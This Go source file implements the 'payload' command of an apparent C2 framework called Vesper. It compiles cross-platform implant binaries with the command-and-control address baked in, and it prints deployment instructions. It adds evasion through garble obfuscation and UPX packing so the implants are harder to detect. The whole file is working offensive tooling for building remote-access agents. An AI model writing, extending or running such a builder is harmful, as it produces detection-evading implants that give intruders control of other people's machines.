package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/spf13/cobra"
)

// truncOut returns at most n bytes of build output (safe for short strings).
func truncOut(s string, n int) string {
	if len(s) > n {
		return s[:n] + "…"
	}
	return strings.TrimSpace(s)
}

func payloadCmd() *cobra.Command {
	cmd := &cobra.Command{
		Use:   "payload",
		Short: "Payload generation and management",
	}

	cmd.AddCommand(&cobra.Command{
		Use:   "generate",
		Short: "Generate a compiled agent payload",
		Long: `Compile a cross-platform Vesper agent payload with configurable options.

The C2 address is baked into the binary (-X main.C2Addr) and can be
overridden at runtime with ./payload --server host:port.

Evasion requires external tools: garble (obfuscation) and/or UPX
(packing). Without them the binary is a plain go build — this is
reported honestly.

Examples:
  vesper payload generate --os linux --arch amd64
  vesper payload generate --os windows --arch amd64 --c2 10.0.0.1:8443 --evasion stealth
  vesper payload generate --os linux --arch arm64 --output /tmp/agent`,
		RunE: func(cmd *cobra.Command, args []string) error {
			targetOS, _ := cmd.Flags().GetString("os")
			targetArch, _ := cmd.Flags().GetString("arch")
			c2Addr, _ := cmd.Flags().GetString("c2")
			output, _ := cmd.Flags().GetString("output")
			evasion, _ := cmd.Flags().GetString("evasion")

			if targetOS == "" {
				targetOS = runtime.GOOS
			}
			if targetArch == "" {
				targetArch = runtime.GOARCH
			}

			fmt.Printf("[*] Building payload: os=%s arch=%s c2=%s\n", targetOS, targetArch, c2Addr)

			// Build the agent binary
			agentDir := filepath.Join("internal", "agent", "cmd", "agent")
			if _, err := os.Stat(agentDir); err != nil {
				return fmt.Errorf("agent source not found: %s", agentDir)
			}

			if output == "" {
				output = fmt.Sprintf("dist/agent-%s-%s", targetOS, targetArch)
				if targetOS == "windows" {
					output += ".exe"
				}
			}

			if err := os.MkdirAll("dist", 0o755); err != nil {
				return fmt.Errorf("creating dist/: %w", err)
			}

			buildEnv := append(os.Environ(),
				"GOOS="+targetOS,
				"GOARCH="+targetArch,
				"CGO_ENABLED=0",
			)
			ldflags := fmt.Sprintf("-s -w -X main.C2Addr=%s", c2Addr)

			build := func(tool string) ([]byte, error) {
				c := exec.Command(tool, "build", "-o", output, "-ldflags", ldflags, ".")
				c.Dir = agentDir
				c.Env = buildEnv
				return c.CombinedOutput()
			}

			tool := "go"
			if evasion != "" {
				if garblePath, _ := exec.LookPath("garble"); garblePath != "" {
					tool = garblePath
				}
			}
			if out, err := build(tool); err != nil {
				return fmt.Errorf("build failed: %v\n%s", err, truncOut(string(out), 400))
			}

			info, err := os.Stat(output)
			if err != nil {
				return fmt.Errorf("verifying output: %w", err)
			}
			fmt.Printf("[+] Payload generated: %s (%s)\n", output, formatSize(info.Size()))

			// Evasion extras (honest reporting: only what really ran)
			if evasion != "" {
				if tool != "go" {
					fmt.Println("  [+] garble obfuscation applied")
				} else {
					fmt.Println("  [!] garble not found — no obfuscation applied")
					fmt.Println("      install: go install mvdan.cc/garble@latest")
				}
				if upxPath, _ := exec.LookPath("upx"); upxPath != "" {
					if upxCmd := exec.Command(upxPath, "--best", "--quiet", output); upxCmd.Run() == nil {
						fmt.Println("  [+] UPX packing applied")
					} else {
						fmt.Println("  [!] UPX present but packing failed — binary left unpacked")
					}
				} else {
					fmt.Println("  [!] UPX not found — no packing applied (apt install upx-ucl)")
				}
			}

			// Print connection info
			fmt.Println()
			fmt.Println("Deployment:")
			fmt.Printf("  ./%s --server %s\n", filepath.Base(output), c2Addr)
			fmt.Println("  (the runtime --server flag overrides the baked-in C2 address)")

			return nil
		},
	})

	cmd.AddCommand(&cobra.Command{
		Use:   "list",
		Short: "List generated payloads",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println("[*] Generated payloads:")
			files, _ := filepath.Glob("dist/*")
			shown := 0
			for _, f := range files {
				if info, err := os.Stat(f); err == nil && !info.IsDir() {
					fmt.Printf("  %s (%s)\n", f, formatSize(info.Size()))
					shown++
				}
			}
			if shown == 0 {
				fmt.Println("  (none — use 'payload generate' to create)")
			}
		},
	})

	cmd.AddCommand(&cobra.Command{
		Use:   "obfuscate",
		Short: "Obfuscate a payload (stub — not implemented yet)",
		Run: func(cmd *cobra.Command, args []string) {
			input, _ := cmd.Flags().GetString("input")
			if input == "" && len(args) > 0 {
				input = args[0]
			}
			if input == "" {
				fmt.Println("[-] Usage: vesper payload obfuscate --input <file>")
				return
			}
			// honest stub: no obfuscation happens here
			fmt.Println("[-] payload obfuscate is not implemented yet — no file was modified")
			fmt.Println("    real obfuscation today: 'payload generate --evasion stealth' (garble + UPX)")
		},
	})

	cmd.AddCommand(&cobra.Command{
		Use:   "info",
		Short: "Show payload build configuration",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Println("[*] Payload build configuration:")
			fmt.Printf("  Build OS:     %s\n", runtime.GOOS)
			fmt.Printf("  Build Arch:   %s\n", runtime.GOARCH)
			fmt.Println("  Supported targets:")
			fmt.Println("    linux/amd64, linux/arm64, windows/amd64, darwin/amd64, darwin/arm64")
			fmt.Println("  Evasion:")
			fmt.Println("    garble obfuscation + UPX packing (requires both tools installed)")
		},
	})

	cmd.PersistentFlags().String("os", "", "Target OS (linux, windows, darwin)")
	cmd.PersistentFlags().String("arch", "", "Target architecture (amd64, arm64)")
	cmd.PersistentFlags().String("c2", "localhost:8443", "C2 server address baked into the binary")
	cmd.PersistentFlags().String("output", "", "Output file path")
	cmd.PersistentFlags().String("evasion", "", "Evasion profile (uses garble + UPX when available)")
	cmd.PersistentFlags().String("input", "", "Input file for obfuscation")

	return cmd
}

func formatSize(size int64) string {
	if size < 1024 {
		return fmt.Sprintf("%dB", size)
	}
	if size < 1024*1024 {
		return fmt.Sprintf("%.1fKB", float64(size)/1024)
	}
	return fmt.Sprintf("%.1fMB", float64(size)/(1024*1024))
}
